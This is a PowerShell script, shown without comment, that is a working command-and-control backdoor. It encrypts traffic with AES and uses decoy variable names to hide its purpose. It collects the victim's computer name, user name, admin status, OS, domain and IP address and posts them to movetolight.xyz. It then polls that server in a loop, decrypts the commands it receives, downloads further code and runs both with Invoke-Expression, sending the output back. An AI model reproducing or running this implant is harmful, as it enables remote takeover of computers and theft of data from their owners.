$exchange=1
function CAM ($key,$maxage){

$reason = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"
$reason.Mode = [System.Security.Cryptography.CipherMode]::CBC
$reason.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$reason.BlockSize = 128
$reason.KeySize = 256
if ($maxage)
{
if ($maxage.getType().Name -eq "String")
{$reason.IV = [System.Convert]::FromBase64String($maxage)}
else
{$reason.IV = $maxage}
}
if ($key)
{
if ($key.getType().Name -eq "String")
{$reason.Key = [System.Convert]::FromBase64String($key)}
else
{$reason.Key = $key}
}
$reason}


function ENC ($key,$embed,$m3utitle=0){
if ($m3utitle -eq 0){
$scale = [System.Text.Encoding]::UTF8.GetBytes($embed)}
else{
$scale=$embed}
$reason = CAM $key
$names = $reason.CreateEncryptor()
$autocomplete = $names.TransformFinalBlock($scale, 0, $scale.Length)
[byte[]] $pass2 = $reason.IV + $autocomplete
[System.Convert]::ToBase64String($pass2)
}


function DEC ($key,$video,$m3utitle=0){
$scale = [System.Convert]::FromBase64String($video)
$maxage = $scale[0..15]
$reason = CAM $key $maxage
$d = $reason.CreateDecryptor()
$u = $d.TransformFinalBlock($scale, 16, $scale.Length - 16)
if ($m3utitle -eq 0){
[System.Text.Encoding]::UTF8.GetString($u)
}
else{
return $u}
}



function load($connect)
      {

            $subscription = enc -key $key -embed $connect

            $parameter = new-object net.WebClient
            $parameter.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
            $parameter.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")

            try{
              $total = @{unstick=$donor;ContactForm=$subscription}
                $imageid=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri https://movetolight.xyz:443/admin -Method POST -Body $total
		$imageid=$imageid.Content
            }
            catch{
                $total = "unstick=$donor&ContactForm=$subscription"
                $parameter = new-object net.WebClient
                $parameter.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
                $parameter.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
                $imageid=$parameter.UploadString("https://movetolight.xyz:443/admin",$total)
                }


            $modulecontent=dec -key $key -video $imageid


      return $modulecontent
      }

$contents = $env:COMPUTERNAME;
if ((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){ $textarea="*"}
$start = $env:USERNAME;
$start ="$textarea$start"
$rollback = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$res = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($rollback)";
$uniqid = (Get-WmiObject Win32_ComputerSystem).Domain;
$upc=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
$viewtype = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$donor="$viewtype-img.jpeg"

$searchterm="ContactForm=$res**$upc**$rollback**$contents**$uniqid**$start**$pid&$viewtype=$donor"
$parameter = new-object net.WebClient
      $parameter.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $parameter.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $key=$parameter.UploadString("https://movetolight.xyz:443/webserviceclient",$searchterm)
$typeid = 'silentlyContinue';

$parameter = New-Object system.Net.WebClient;
$windows=$donor
while($true){
$characters=[int](Get-Date -UFormat "%s")%97
$path=Get-Random -Minimum 50 -Maximum 250 -SetSeed $characters
$compression=-join ((65..90)*500 + (97..122)*500 | Get-Random -Count $path | % {[char]$_});


try{
    $total = @{unstick=$donor;token=$compression}
$video=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri https://movetolight.xyz:443/publishing -Method POST -Body $total
$video=$video.Content
}
 catch{
$total="unstick=$donor&token=$compression"
        $parameter = new-object net.WebClient
      $parameter.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $parameter.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $video=$parameter.UploadString("https://movetolight.xyz:443/publishing",$total)
        }



if($video -eq "REGISTER"){
$parameter = new-object net.WebClient
      $parameter.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $parameter.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $key=$parameter.UploadString("https://movetolight.xyz:443/webserviceclient",$searchterm)
$typeid = 'silentlyContinue';
continue
}
$reg=echo $video | select-string -Pattern "\-\*\-\*\-\*"
if($reg)
#$video -eq "-")
{
$characters=[int](Get-Date -UFormat "%s")
$User=[int]$exchange/2+1
$read=[int]$exchange+1
$exchange=Get-Random -Minimum $User -Maximum $read -SetSeed $characters
sleep $exchange
$force = (Get-Date -Format "dd/MM/yyyy")
$force = [datetime]::ParseExact($force,"dd/MM/yyyy",$null)
$phpThumbDebug = [datetime]::ParseExact("10/10/2025","dd/MM/yyyy",$null)
if ($phpThumbDebug -lt $force) {kill $pid}
}
else{
$databases=dec -key $key -video $video



if($databases.split(" ")[0] -eq "load"){
$autocomplete=$databases.split(" ")[1]
$connect=load -connect $autocomplete
try{
$query=Invoke-Expression ($connect) -ErrorVariable dbms | Out-String
        }
        catch{
        $query = $Error[0] | Out-String;
        }
        if ($query.Length -eq 0){
        $query="$query$dbms"
        }


}
else{
try{
$query=Invoke-Expression ($databases) -ErrorVariable dbms | Out-String
        }
        catch{
        $query = $Error[0] | Out-String;
        }
        if ($query.Length -eq 0){
        $query="$query$dbms"
        }}

  if ($query.Length -eq 0){
$query="$query$dbms"
}

$tableprefix=enc -key $key -embed $query






 try{
      $total = @{unstick=$donor;ContactForm=$tableprefix}
$todate=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri https://movetolight.xyz:443/uddisoap -Method POST -Body $total
}
 catch{
 $total = "unstick=$donor&ContactForm=$tableprefix"
        $parameter = new-object net.WebClient
      $parameter.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $parameter.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $todate=$parameter.UploadString("https://movetolight.xyz:443/uddisoap","POST",$total)
        }

$todate=" "
$query=" "
}
}
